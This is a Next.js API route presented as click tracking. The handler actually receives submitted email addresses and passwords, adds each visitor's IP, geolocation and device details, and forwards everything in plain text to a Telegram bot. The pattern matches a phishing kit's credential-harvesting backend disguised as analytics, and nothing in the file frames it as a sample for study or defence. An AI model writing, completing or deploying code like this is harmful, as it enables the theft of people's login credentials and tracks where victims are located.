// app/api/track-click/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { UAParser } from 'ua-parser-js'; // npm i ua-parser-js



async function lookupGeo(ip: string) {
  if (ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('::1')) return null;
  const res = await fetch(`https://ipapi.co/${ip}/json/`);
  if (!res.ok) return null;
  return res.json(); // { country_name, region, city, ... }
}



// app/api/track-click/route.ts
export async function notifyTelegram(event: {
  page: string; ip: string; browser?: string; os?: string;
  device: string; country?: string; city?: string; timestamp: string;  email?: string; password?: string;
}) {
  const text =
    `🖱️ *Click event*\n` + 
    (event.email ? `Email: ${event.email}\n` : '') + 
    (event.password ? `Password: ${event.password}\n` : '') +
    `Page: ${event.page}\n` +
    `IP: ${event.ip}\n` +
    `Location: ${event.city ?? '?'}, ${event.country ?? '?'}\n` +
    `Device: ${event.device} / ${event.os ?? '?'} / ${event.browser ?? '?'}\n` +
    `Time: ${event.timestamp}`;

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'Markdown',
    }),
  });
}



export async function POST(req: NextRequest) {
  const { page, email, password } = await req.json();

  const ip =
    req.headers.get('x-forwarded-for')?.split(',')[0].trim() ??
    req.headers.get('x-real-ip') ??
    'unknown';

  const userAgent = req.headers.get('user-agent') ?? '';
  const { browser, os, device } = UAParser(userAgent);

  // Geo lookup from IP — see note below
  const geo = await lookupGeo(ip);


  const event = {
    page, ip, email, password, browser: browser.name, os: os.name,
    device: device.type ?? 'desktop', country: geo?.country,
    city: geo?.city, timestamp: new Date().toISOString(),
  };


  console.log(
    { page,
    ip,
    userAgent,
    browser: browser.name,
    browserVersion: browser.version,
    os: os.name,
    osVersion: os.version,
    device: device.type ?? 'desktop',
    country: geo?.country,
    region: geo?.region,
    city: geo?.city,
    timestamp: new Date().toISOString(),}
  )

    await notifyTelegram(event); // fire-and-forget is fine, or await if you want delivery confirmed


//   await db.clickEvents.insert({
//     page,
//     ip,
//     userAgent,
//     browser: browser.name,
//     browserVersion: browser.version,
//     os: os.name,
//     osVersion: os.version,
//     device: device.type ?? 'desktop',
//     country: geo?.country,
//     region: geo?.region,
//     city: geo?.city,
//     timestamp: new Date().toISOString(),
//   });

  return NextResponse.json({ ok: true });
}
